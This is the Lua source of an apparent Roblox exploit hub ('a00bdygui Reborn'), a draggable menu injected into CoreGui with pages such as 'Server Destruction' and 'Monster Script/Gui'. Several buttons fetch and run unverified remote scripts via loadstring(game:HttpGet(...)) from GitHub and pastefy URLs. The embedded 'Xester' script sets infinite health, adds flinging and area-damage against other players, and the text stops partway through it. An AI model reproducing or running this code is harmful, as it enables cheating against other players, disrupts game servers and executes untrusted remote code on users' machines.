blak = Color3.new(0,0,0)
rede = Color3.new(0.560784, 0.560784, 0.419608)
tef = "SourceSans"
whit = Color3.new(255/255,255/255,255/255)
local cka = Instance.new("ScreenGui", game.CoreGui)
cka.Name= "a00bdyGui"
local frame = Instance.new("Frame")
frame.Parent = cka
frame.BackgroundColor3 = blak
frame.BorderColor3 = rede
frame.BorderSizePixel = 3
frame.Name = "Frame"
frame.Position = UDim2.new(0,3,0.3,0)
frame.Size = UDim2.new(0,300,0,400)
frame.Active = true
frame.Draggable = true
local pges = Instance.new("Frame")
pges.Parent = frame
pges.BackgroundColor3 = blak
pges.BorderColor3 = rede
pges.BorderSizePixel = 3
pges.Name = "Pages"
pges.Position = UDim2.new(0,0,0,0)
pges.Size = UDim2.new(1,0,1,0)
local cope = Instance.new("TextButton")
cope.Parent = cka
cope.Active = true
cope.AutoButtonColor = true
cope.BackgroundColor3 = blak
cope.BorderColor3 = rede
cope.BorderSizePixel = 3
cope.Name = "Close/Open"
cope.Position = UDim2.new(0,3,0.3,380)
cope.Selectable = true
cope.Size = UDim2.new(0,300,0,20)
cope.ZIndex = 3
cope.Font = "SourceSans"
cope.FontSize = "Size18"
cope.Text = "Close"
cope.TextColor3 = Color3.new(255,255,255)
cope.TextXAlignment = "Center"
cope.TextYAlignment = "Center"
cope.MouseButton1Down:connect(function()
	if cope.Text == "Close" then
		frame.Visible = false
		cope.Text = "Open" else
		frame.Visible = true
		cope.Text = "Close"	
	end	
end)
local page1 = Instance.new("Frame")
page1.Parent = pges	
page1.BackgroundColor3 = blak
page1.BorderColor3 = rede
page1.BorderSizePixel = 3
page1.Name = "Page1"
page1.Position = UDim2.new(0,0,0,83)
page1.Size = UDim2.new(1,0,1,-106)
page1.ZIndex = 2
page1.Visible = true
local page2 = Instance.new("Frame")
page2.Parent = pges
page2.BackgroundColor3 = blak
page2.BorderColor3 = rede
page2.BorderSizePixel = 3
page2.Name = "Page2"
page2.Position = UDim2.new(0,0,0,83)
page2.Size = UDim2.new(1,0,1,-106)
page2.ZIndex = 2
page2.Visible = false
local page3 = Instance.new("Frame")
page3.Parent = pges
page3.BackgroundColor3 = blak
page3.BorderColor3 = rede
page3.BorderSizePixel = 3
page3.Name = "Page3"
page3.Position = UDim2.new(0,0,0,83)
page3.Size = UDim2.new(1,0,1,-106)
page3.ZIndex = 2
page3.Visible = false
local page4 = Instance.new("Frame")
page4.Parent = pges
page4.BackgroundColor3 = blak
page4.BorderColor3 = rede
page4.BorderSizePixel = 3
page4.Name = "Page4"
page4.Position = UDim2.new(0,0,0,83)
page4.Size = UDim2.new(1,0,1,-106)
page4.ZIndex = 2
page4.Visible = false
local page5 = Instance.new("Frame")
page5.Parent = pges
page5.BackgroundColor3 = blak
page5.BorderColor3 = rede
page5.BorderSizePixel = 3
page5.Name = "Page5"
page5.Position = UDim2.new(0,0,0,83)
page5.Size = UDim2.new(1,0,1,-106)
page5.ZIndex = 2
page5.Visible = false
page = Instance.new("Frame")
page.Parent = frame
page.BackgroundColor3 = blak
page.BorderColor3 = rede
page.BorderSizePixel = 3
page.Name = "Settings"
page.Position = UDim2.new(1,3,0,0)
page.Size = UDim2.new(1,0,1,0)
page.ZIndex = 1
page.Visible = true
right = Instance.new("TextButton")
right.Parent = frame	
right.BackgroundColor3 = blak
right.BorderColor3 = rede
right.BorderSizePixel = 3
right.Name = ">"
right.Position = UDim2.new(0.5,3,0,40)
right.Size = UDim2.new(0.5,-3,0,40)
right.ZIndex = 2
right.Font = tef
right.FontSize = "Size48"
right.Text = ">"
right.TextColor3 = whit
addonr = Instance.new("TextButton")
addonr.Parent = page5	
addonr.BackgroundColor3 = blak
addonr.BorderColor3 = rede
addonr.BorderSizePixel = 3
addonr.Name = "addonr"
addonr.Position = UDim2.new(0,153,0,-40)
addonr.Size = UDim2.new(0.49,0,0.125,0)
addonr.Font = tef
addonr.FontSize = "Size48"
addonr.Text = ">"
addonr.TextColor3 = whit
addonr.ZIndex = 3
left = Instance.new("TextButton")
left.Parent = frame	
left.BackgroundColor3 = blak
left.BorderColor3 = rede
left.BorderSizePixel = 3
left.Name = "<"
left.Position = UDim2.new(0,0,0,40)
left.Size = UDim2.new(0.5,-3,0,40)
left.ZIndex = 2
left.Font = tef
left.FontSize = "Size48"
left.Text = "<"
left.TextColor3 = whit
addonl = Instance.new("TextButton")
addonl.Parent = page1	
addonl.BackgroundColor3 = blak
addonl.BorderColor3 = rede
addonl.BorderSizePixel = 3
addonl.Name = "addonl"
addonl.Position = UDim2.new(0,0,0,-40)
addonl.Size = UDim2.new(0.49,0,0.125,0)
addonl.Font = tef
addonl.FontSize = "Size48"
addonl.Text = "<"
addonl.TextColor3 = whit
addonl.ZIndex = 3
local title = Instance.new("TextLabel")
title.Parent = frame
title.BackgroundColor3 = blak
title.BorderColor3 = rede
title.BorderSizePixel = 3
title.Name = "Title"
title.Position = UDim2.new(0,0,0,0)
title.Size = UDim2.new(1,0,0,40)
title.ZIndex = 2
title.Font = tef
title.FontSize = "Size24"
title.Text = "a00bdygui Reborn Rc7 by v3rx"
title.TextColor3 = whit
--           inside pages        --
local acg = Instance.new("Frame")
acg.Parent = page1
acg.BackgroundColor3 = blak
acg.BorderColor3 = rede
acg.BorderSizePixel = 3
acg.Name = "Monster Script/Gui"
acg.Position = UDim2.new(0.5,3,0,0)
acg.Size = UDim2.new(0.5,-3,1,0)
acg.ZIndex = 2
local sd = Instance.new("Frame")
sd.Parent = page1
sd.BackgroundColor3 = blak
sd.BorderColor3 = rede
sd.BorderSizePixel = 3
sd.Name = "Server Destruction"
sd.Position = UDim2.new(0,0,0,0)
sd.Size = UDim2.new(0.5,-3,1,0)
sd.ZIndex = 2
local gt = Instance.new("Frame")
gt.Parent = page2
gt.BackgroundColor3 = blak
gt.BorderColor3 = rede
gt.BorderSizePixel = 3
gt.Name = "Gear/Tools"
gt.Position = UDim2.new(0.5,3,0,0)
gt.Size = UDim2.new(0.5,-3,1,0)
gt.ZIndex = 2
local ws = Instance.new("Frame")
ws.Parent = page2
ws.BackgroundColor3 = blak
ws.BorderColor3 = rede
ws.BorderSizePixel = 3
ws.Name = "Weapon Scripts"
ws.Position = UDim2.new(0,0,0,0)
ws.Size = UDim2.new(0.5,-3,1,0)
ws.ZIndex = 2
local localp = Instance.new("Frame")
localp.Parent = page3
localp.BackgroundColor3 = blak
localp.BorderColor3 = rede
localp.BorderSizePixel = 3
localp.Name = "LocalPlayer"
localp.Position = UDim2.new(0.5,3,0,0)
localp.Size = UDim2.new(0.5,-3,1,0)
localp.ZIndex = 2
local misc = Instance.new("Frame")
misc.Parent = page3
misc.BackgroundColor3 = blak
misc.BorderColor3 = rede
misc.BorderSizePixel = 3
misc.Name = "Misc"
misc.Position = UDim2.new(0,0,0,0)
misc.Size = UDim2.new(0.5,-3,1,0)
misc.ZIndex = 2
pmi = Instance.new("Frame")
pmi.Parent = page4
pmi.BackgroundColor3 = blak
pmi.BorderColor3 = rede
pmi.BorderSizePixel = 3
pmi.Name = "Preset Music IDs"
pmi.Position = UDim2.new(0.5,3,0,0)
pmi.Size = UDim2.new(0.5,-3,1,0)
pmi.ZIndex = 2
local psd = Instance.new("Frame")
psd.Parent = page4
psd.BackgroundColor3 = blak
psd.BorderColor3 = rede
psd.BorderSizePixel = 3
psd.Name = "Preset Skybox/Decal IDs"
psd.Position = UDim2.new(0,0,0,0)
psd.Size = UDim2.new(0.5,-3,1,0)
psd.ZIndex = 2
local edn = Instance.new("Frame")
edn.Parent = page5
edn.BackgroundColor3 = blak
edn.BorderColor3 = rede
edn.BorderSizePixel = 3
edn.Name = "End"
edn.Position = UDim2.new(0.5,3,0,0)
edn.Size = UDim2.new(0.5,-3,1,0)
edn.ZIndex = 2
local pgi = Instance.new("Frame")
pgi.Parent = page5
pgi.BackgroundColor3 = blak
pgi.BorderColor3 = rede
pgi.BorderSizePixel = 3
pgi.Name = "Preset Gear IDs"
pgi.Position = UDim2.new(0,0,0,0)
pgi.Size = UDim2.new(0.5,-3,1,0)
pgi.ZIndex = 2
--      inside pages end        --
-- Monster Script/Gui --
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Scp-096"
button.Position = UDim2.new(0,0,0,33)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Scp-096"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()

--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 48474294 451220849 2309346267 62724852 48474313 376527115 301818806 62234425 63690008")

	wait(1)

	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-net")

	wait(1)

	loadstring(game:HttpGet('https://raw.githubusercontent.com/TKFPc30/scp-096/main/main.lua'))()
end)
--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Fe Monster"
button.Position = UDim2.new(0.5,3,0,33)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Fe Ink Monster V2"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 63690008 48474294 62724852 48474313")

	wait(1)

	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-net")

	wait(1)

	loadstring(game:HttpGet("https://pastefy.ga/Lb4LeKXB/raw"))()
end)
--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Fe Satan"
button.Position = UDim2.new(0,0,0,66)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Fe satan"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 10775031176, 12103236257, 9867481700, 9867487176, 9350274205, 2493590711, 9350274205, 9402600266, 2309346267")

	wait(1)

	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-net")

	wait(1)

	loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty36.lua"))()
end)	
--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Fe Monster"
button.Position = UDim2.new(0.5,3,0,66)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Fe monster"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	
	--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 12103236257 9402600266 9867487176 9867481700 10775031176 9661543986 9350274205 11713077437")

	wait(1)

	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-net")

	wait(1)
	
	loadstring(game:HttpGet("https://raw.githubusercontent.com/TKFPc30/fe-giant-monster/main/main.lua"))()

end)
--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Reanimation"
button.Position = UDim2.new(0,0,0,99)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Reanimation"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	local Methods = loadstring(game:HttpGet("https://raw.githubusercontent.com/coolsk8rboy/The-John-Cena-Factory/main/JohnCenasMain.lua"))()
	Methods:SetWalkSpeed(18)
	Methods:SetIdleAnimation(14637774107, .1, 6)
	Methods:SetWalkAnimation(14637866841, .1, 6)
	Methods:NewAttack("L", "e", 14637910371, .1, 9)
	Methods:NewAttack("Floss", "f", 14637998268, .1, 6)
	Methods:NewAttack("Play", "N", 14638003545, .1, 6)
	Methods:NewAttack("Laugh", "R", 14645273120, .1, 6)
	Methods:NewAttack("Peter", "Q", 14645298787, .1, 6)
	Methods:NewAttack("Kick", "T", 14645314001, .1, 6)
	Methods:SystemMessage([[
Controls:
E - Take The L
F - Floss
N - Play with your hats
R - Laugh
Q - Peter Parker
T - Kazotsky Kick
---Innovation was here :)
]])
	Methods:SetScriptCreator("Innovation on scriptblox")
	Methods:BodyPartFlingOnTouch("Left Arm")
	Methods:RunScript()
end)
--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "to r6"
button.Position = UDim2.new(0.5,3,0,99)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "to r6"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	getgenv().lastPos = true -- false/true
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/refs/heads/main/ChangeRigType"))()
end)

--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Xester"
button.Position = UDim2.new(0,0,0,132)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Xester"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	-----------/XESTER THE CARD MASTER\\-----------
--[[Movelist
Q = The disappearing act.
E = Full house
R = Cardnado
T = Teleport
Y = Big card(Click to smash.)
U = Black hole
P = Card shield(Click to bounce people off, press p again to shred.)
F = Transform(You can switch between modes any time.)
-----------/SECOND FORM MOVES\-----------
T = Laugh
G = Fire ball
H = Huge fire ball
J = Dragon's breath(The longer you hold, the more insaner it gets.)
K = Beam(The longer you hold down the key, the stronger it gets/longer it lasts.)
---------]]

	--"Now you see me 2" is a good movie, which is why i've made this.--
	--Sadly, this got logged, one of my best work just being thrown out like this is a real shame.--
	--This was made before FE so using this may or may not lag the server--
	--Keep in mind that THIS was never even finished at all, i stopped working on this when skidcentric leaked it, who knows how big this script could've been?--
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Reanimation.lua"))()

	Player=game:GetService("Players").LocalPlayer
	Character=game.Workspace.non
	Character.Humanoid.Name = "noneofurbusiness"
	hum = Character.noneofurbusiness
	LeftArm=Character["Left Arm"]
	LeftLeg=Character["Left Leg"]
	RightArm=Character["Right Arm"]
	RightLeg=Character["Right Leg"]
	Root=Character["HumanoidRootPart"]
	Head=Character["Head"]
	Torso=Character["Torso"]
	Neck=Torso["Neck"]
	walking = false
	jumping = false
	allowgrassy = false
	zxc = false
	matte = nil
	colori = nil
	bigball = false
	attacking = false
	laughing = false
	running = false
	downpress = false
	taim = nil
	change = 0
	ws = 25
	appi = false
	tauntdebounce = false
	position = nil
	staybooming = false
	MseGuide = true
	levitate = false
	firsttime5 = false
	notallowedtransform = false
	settime = 0
	firsttime2 = false
	sine = 0
	t = 0
	combo1 = true
	dgs = 75
	combo2 = false
	firsttime3 = false
	combo3 = false
	local bl = {907530553,907527750,907527912}
	colortable = {"Really black","Really red"}
	colors = #colortable
	blz = #bl
	local aces = {1880203893,1881287656,1881287420,1881288034}
	ace = #aces
	local laughs = {2011349649,2011349983,2011351501,2011352223,2011355991,2011356475}
	laugh = #laughs
	mouse = Player:GetMouse()
	RunSrv = game:GetService("RunService")
	RenderStepped = game:GetService("RunService").RenderStepped
	removeuseless = game:GetService("Debris")
	damageall={}
	Repeater={}
	Repeater2={}
	magictable={}
	nonmeshRepeater={}
	nonmeshRepeater2={}
	dmgii={}
	DamageAll2={}
	SlowlyFade={}
	th1={}
	lolzor={}
	lolzor2={}
	th2={}
	keyYsize={}
	blocktrail={}
	keyYtransparency={}
	th3={}
	laughingtable={}
	Extreme={}
	ExtremeM={}
	ExtremeM2={}
	m3={}
	th4={}
	th5={}
	UpMover={}
	openshocktable={}
	LessSize={}
	ForwardMover={}
	FadeIn={}
	signtransparency={}
	signmover={}
	signrotator={}

	screenGui = Instance.new("ScreenGui")
	screenGui.Parent = script.Parent

	FireBall = Instance.new("Sound",LeftArm)
	FireBall.SoundId = "rbxassetid://842332424"
	FireBall.Volume = 5
	FireBall.Pitch = 2.5

	BigFireBall = Instance.new("Sound",LeftArm)
	BigFireBall.SoundId = "rbxassetid://842332424"
	BigFireBall.Volume = 8
	BigFireBall.Pitch = 1.5

	local HEADLERP = Instance.new("ManualWeld")
	HEADLERP.Parent = Head
	HEADLERP.Part0 = Head
	HEADLERP.Part1 = Head
	HEADLERP.C0 = CFrame.new(0, -1.5, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

	local TORSOLERP = Instance.new("ManualWeld")
	TORSOLERP.Parent = Root
	TORSOLERP.Part0 = Torso
	TORSOLERP.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

	local ROOTLERP = Instance.new("ManualWeld")
	ROOTLERP.Parent = Root
	ROOTLERP.Part0 = Root
	ROOTLERP.Part1 = Torso
	ROOTLERP.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

	local RIGHTARMLERP = Instance.new("ManualWeld")
	RIGHTARMLERP.Parent = RightArm
	RIGHTARMLERP.Part0 = RightArm
	RIGHTARMLERP.Part1 = Torso
	RIGHTARMLERP.C0 = CFrame.new(-1.5, 0, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

	local LEFTARMLERP = Instance.new("ManualWeld")
	LEFTARMLERP.Parent = LeftArm
	LEFTARMLERP.Part0 = LeftArm
	LEFTARMLERP.Part1 = Torso
	LEFTARMLERP.C0 = CFrame.new(1.5, 0, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

	local RIGHTLEGLERP = Instance.new("ManualWeld")
	RIGHTLEGLERP.Parent = RightLeg
	RIGHTLEGLERP.Part0 = RightLeg
	RIGHTLEGLERP.Part1 = Torso
	RIGHTLEGLERP.C0 = CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

	local LEFTLEGLERP = Instance.new("ManualWeld")
	LEFTLEGLERP.Parent = LeftLeg
	LEFTLEGLERP.Part0 = LeftLeg
	LEFTLEGLERP.Part1 = Torso
	LEFTLEGLERP.C0 = CFrame.new(0.5, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))

	local function weldBetween(a, b)
		local weld = Instance.new("ManualWeld", a)
		weld.Part0 = a
		weld.Part1 = b
		weld.C0 = a.CFrame:inverse() * b.CFrame
		return weld
	end

	function makeblockytrail()
		coroutine.wrap(function()
			while true do
				for i,v in pairs(blocktrail) do
					smke = Instance.new("Part",v)
					smke.CFrame = v.CFrame * CFrame.Angles(math.random(-180,180),math.random(-180,180),math.random(-180,180))
					smke.Material = "Neon"
					smke.Anchored = true
					smke.CanCollide = false
					removeuseless:AddItem(smke,2)
				end
				swait()
			end
		end)()
	end

	local function ci(x, c, y, n)
		so = Instance.new("Sound", x)
		so.SoundId = c
		so.Volume = y
		so.Looped = n
	end

	function ghost()
		fakeeyo2 = Instance.new("Part",Head)
		fakeeyo2.BrickColor = BrickColor.new("White")
		fakeeyo2.Material = "Neon"
		fakeeyo2.Shape = "Ball"
		fakeeyo2.Anchored = true
		fakeeyo2.CFrame = eyo2.CFrame
		fakeeyo2.CanCollide = false
		fakeeyo2.Size = Vector3.new(0.33, 0.33, 0.33)
		table.insert(ghosttable,fakeeyo2)
		removeuseless:AddItem(fakeeyo2,3)

		fakeeyo1 = Instance.new("Part",Head)
		fakeeyo1.BrickColor = BrickColor.new("White")
		fakeeyo1.Material = "Neon"
		fakeeyo1.Shape = "Ball"
		fakeeyo1.CanCollide = false
		fakeeyo1.Anchored = true
		fakeeyo1.CFrame = eyo1.CFrame
		fakeeyo1.Size = Vector3.new(0.33, 0.33, 0.33)
		table.insert(ghosttable,fakeeyo1)
		removeuseless:AddItem(fakeeyo1,3)

		fakemask = Instance.new("Part",Character)
		fakemask.Size = Vector3.new(1,1,1)
		fakemask.CFrame = mask.CFrame
		fakemask.Material = "Neon"
		fakemask.CanCollide = false
		fakemask.Anchored = true
		fakemask.BrickColor = BrickColor.new("White")
		fakemask.Transparency = .5
		mfMask = Instance.new("SpecialMesh", fakemask)
		mfMask.MeshType = "FileMesh"
		mfMask.Scale = Vector3.new(0.13, 0.13, 0.1)
		mfMask.MeshId = 'http://www.roblox.com/asset/?id=5158270'
		table.insert(ghosttable,fakemask)
		removeuseless:AddItem(fakemask,3)





		fakehead = Instance.new("Part",Character)
		fakehead.Size = Vector3.new(1.01,1.01,1.01)
		fakehead.Anchored = true
		fakehead.CanCollide = false
		fakehead.Transparency = .5
		fakehead.BrickColor = BrickColor.new("White")
		fakehead.Material = "Neon"
		fakehead.CFrame = Head.CFrame
		fakeheadmesh = Instance.new("SpecialMesh",fakehead)
		fakeheadmesh.MeshType = "Head"
		fakeheadmesh.Scale = Vector3.new(1.255,1.255,1.255)
		table.insert(ghosttable,fakehead)
		removeuseless:AddItem(fakehead,3)


		fakelarm = Instance.new("Part",Character)
		fakelarm.CFrame = LeftArm.CFrame
		fakelarm.Size = Vector3.new(1,2,1)
		fakelarm.CanCollide = false
		fakelarm.Transparency = .5
		fakelarm.Material = "Neon"
		fakelarm.Anchored = true
		table.insert(ghosttable,fakelarm)
		removeuseless:AddItem(fakelarm,3)


		fakerarm = Instance.new("Part",Character)
		fakerarm.CFrame = RightArm.CFrame
		fakerarm.Size = Vector3.new(1,2,1)
		fakerarm.Transparency = .5
		fakerarm.CanCollide = false
		fakerarm.Material = "Neon"
		fakerarm.Anchored = true
		table.insert(ghosttable,fakerarm)
		removeuseless:AddItem(fakerarm,3)


		fakelleg = Instance.new("Part",Character)
		fakelleg.CFrame = LeftLeg.CFrame
		fakelleg.Size = Vector3.new(1,2,1)
		fakelleg.Transparency = .5
		fakelleg.CanCollide = false
		fakelleg.Material = "Neon"
		fakelleg.Anchored = true
		table.insert(ghosttable,fakelleg)
		removeuseless:AddItem(fakelleg,3)


		fakerleg = Instance.new("Part",Character)
		fakerleg.CFrame = RightLeg.CFrame
		fakerleg.Size = Vector3.new(1,2,1)
		fakerleg.Transparency = .5
		fakerleg.CanCollide = false
		fakerleg.Material = "Neon"
		fakerleg.Anchored = true
		table.insert(ghosttable,fakerleg)
		removeuseless:AddItem(fakerleg,3)


		fakeTorso = Instance.new("Part",Character)
		fakeTorso.CFrame = Torso.CFrame
		fakeTorso.Size = Vector3.new(2,2,1)
		fakeTorso.Transparency = .5
		fakeTorso.CanCollide = false
		fakeTorso.Material = "Neon"
		fakeTorso.Anchored = true
		table.insert(ghosttable,fakeTorso)
		removeuseless:AddItem(fakeTorso,3)
	end

	ghosttable={}
	coroutine.wrap(function()
		while true do
			for i,v in pairs(ghosttable) do
				v.Transparency = v.Transparency + 0.025
			end
			wait()
		end
	end)()

	function MAKETRAIL(PARENT,POSITION1,POSITION2,LIFETIME,COLOR)
		A = Instance.new("Attachment", PARENT)
		A.Position = POSITION1
		A.Name = "A"
		B = Instance.new("Attachment", PARENT)
		B.Position = POSITION2
		B.Name = "B"
		tr1 = Instance.new("Trail", PARENT)
		tr1.Attachment0 = A
		tr1.Attachment1 = B
		tr1.Enabled = true
		tr1.Lifetime = LIFETIME
		tr1.TextureMode = "Static"
		tr1.LightInfluence = 0
		tr1.Color = COLOR
		tr1.Transparency = NumberSequence.new(0, 1)
	end

	function clean()
		damageall={}
		Repeater={}
		Repeater2={}
		nonmeshRepeater={}
		nonmeshRepeater2={}
		dmgii={}
		DamageAll2={}
		SlowlyFade={}
		th1={}
		th2={}
		th3={}
		Extreme={}
		ExtremeM={}
		ExtremeM2={}
		m3={}
		th4={}
		th5={}
		UpMover={}
		openshocktable={}
		LessSize={}
		ForwardMover={}
		FadeIn={}
		signtransparency={}
		signmover={}
		signrotator={}
	end

	coroutine.wrap(function()
		while wait() do
			hum.WalkSpeed = ws
			LeftArm.BrickColor = BrickColor.new("Really black")
			RightArm.BrickColor = BrickColor.new("Really black")
			Head.BrickColor = BrickColor.new("Really black")
		end
	end)()
	godmode = coroutine.wrap(function()
		for i,v in pairs(Character:GetChildren()) do
			if v:IsA("BasePart") and v ~= Root then
				v.Anchored = false
			end
		end
		while true do
			hum.MaxHealth = math.huge
			wait(0.0000001)
			hum.Health = math.huge
			wait()
		end
	end)
	godmode()
	ff = Instance.new("ForceField", Character)
	ff.Visible = false

	coroutine.wrap(function()
		for i,v in pairs(Character:GetChildren()) do
			if v.Name == "Animate" then v:Remove()
			end
		end
	end)()

	function damagealll(Radius,Position)		
		local Returning = {}		
		for _,v in pairs(workspace:GetChildren()) do		
			if v~=Character and v:FindFirstChildOfClass('Humanoid') and v:FindFirstChild('Torso') or v:FindFirstChild('UpperTorso') then
				if v:FindFirstChild("Torso") then		
					local Mag = (v.Torso.Position - Position).magnitude		
					if Mag < Radius then		
						table.insert(Returning,v)		
					end
				elseif v:FindFirstChild("UpperTorso") then	
					local Mag = (v.UpperTorso.Position - Position).magnitude		
					if Mag < Radius then		
						table.insert(Returning,v)		
					end
				end	
			end		
		end		
		return Returning		
	end

	ArtificialHB = Instance.new("BindableEvent", script)
	ArtificialHB.Name = "Heartbeat"
	script:WaitForChild("Heartbeat")

	frame = 1 / 60
	tf = 0
	allowframeloss = false
	tossremainder = false


	lastframe = tick()
	script.Heartbeat:Fire()


	game:GetService("RunService").Heartbeat:connect(function(s, p)
		tf = tf + s
		if tf >= frame then
			if allowframeloss then
				script.Heartbeat:Fire()
				lastframe = tick()
			else
				for i = 1, math.floor(tf / frame) do
					script.Heartbeat:Fire()
				end
				lastframe = tick()
			end
			if tossremainder then
				tf = 0
			else
				tf = tf - frame * math.floor(tf / frame)
			end
		end
	end)

	function swait(num)
		if num == 0 or num == nil then
			game:service("RunService").Stepped:wait(0)
		else
			for i = 0, num do
				game:service("RunService").Stepped:wait(0)
			end
		end
	end

	doomtheme = Instance.new("Sound", Torso)
	doomtheme.Volume = 3
	doomtheme.Name = "doomtheme"
	doomtheme.Looped = true
	doomtheme.SoundId = "rbxassetid://1843358057"
	doomtheme:Play()

	Torso.ChildRemoved:connect(function(removed)
		if removed.Name == "doomtheme" then
			if levitate then
				doomtheme = Instance.new("Sound", Torso)
				doomtheme.Volume = 3
				doomtheme.Name = "doomtheme"
				doomtheme.Looped = true
				doomtheme.SoundId = "rbxassetid://1382488262"
				doomtheme:Play()
				doomtheme.TimePosition = 20.7
			else
				doomtheme = Instance.new("Sound", Torso)
				doomtheme.Volume = 3
				doomtheme.Name = "doomtheme"
				doomtheme.Looped = true
				doomtheme.SoundId = "rbxassetid://1843358057"
				doomtheme:Play()
			end
		end
	end)



	glow = Instance.new("Part",Head)
	glow.Size = Vector3.new(.488,.3,.1)
	glow.CanCollide = false
	glow.Material = "Neon"
	glow.Transparency = 1
	glow.BrickColor = BrickColor.new("Really white")
	glowweld = weldBetween(glow,Head)
	glowweld.C0 = CFrame.new(0,.2,.565)

	leftlocation = Instance.new("Part",LeftArm)
	leftlocation.Size = Vector3.new(1,1,1)
	leftlocation.Transparency = 1
	leftlocationweld = weldBetween(leftlocation,LeftArm)
	leftlocationweld.C0 = CFrame.new(0,1.2,0)
	rightlocation = Instance.new("Part",RightArm)
	rightlocation.Size = Vector3.new(1,1,1)
	rightlocation.Transparency = 1
	rightlocationweld = weldBetween(rightlocation,RightArm)
	rightlocationweld.C0 = CFrame.new(0,1.2,0)

	shirt = Instance.new("Shirt", Character)
	shirt.Name = "Shirt"
	pants = Instance.new("Pants", Character)
	pants.Name = "Pants"
	Character.Shirt.ShirtTemplate = "rbxassetid://676428254"----lol
	Character.Pants.PantsTemplate = "rbxassetid://676428351"

	fakehed = Instance.new("Part",Character)
	fakehed.Size = Vector3.new(1.01,1.01,1.01)
	fakehed.Anchored = false
	fakehed.CanCollide = false
	fakehed.Transparency = 0
	fakehed.BrickColor = BrickColor.new("Really black")
	fakehed.Material = "Neon"
	fakehed.CFrame = Head.CFrame
	fakehedweld = weldBetween(fakehed,Head)
	fakehedmesh = Instance.new("SpecialMesh",fakehed)
	fakehedmesh.MeshType = "Head"
	fakehedmesh.Scale = Vector3.new(1.255,1.255,1.255)

	jester = Instance.new("Part",Character)
	jester.Size = Vector3.new(2,2,2)
	jester.CFrame = Head.CFrame
	jester.CanCollide = false
	jesterWeld = Instance.new("Weld",jester)
	jesterWeld.Part0 = jester
	jesterWeld.Part1 = Head
	jesterWeld.C0 = jester.CFrame:inverse() * Head.CFrame * CFrame.new(0,-.3,0) * CFrame.Angles(math.rad(0),math.rad(90),0)
	mjester = Instance.new("SpecialMesh", jester)
	mjester.MeshType = "FileMesh"
	mjester.Scale = Vector3.new(1.1, 1.1, 1.1)
	mjester.MeshId,mjester.TextureId = 'rbxassetid://1241662062','rbxassetid://1241662395'

	mask = Instance.new("Part",Character)
	mask.Size = Vector3.new(1,1,1)
	mask.CFrame = Head.CFrame
	mask.CanCollide = false
	maskweld = weldBetween(mask,Head)
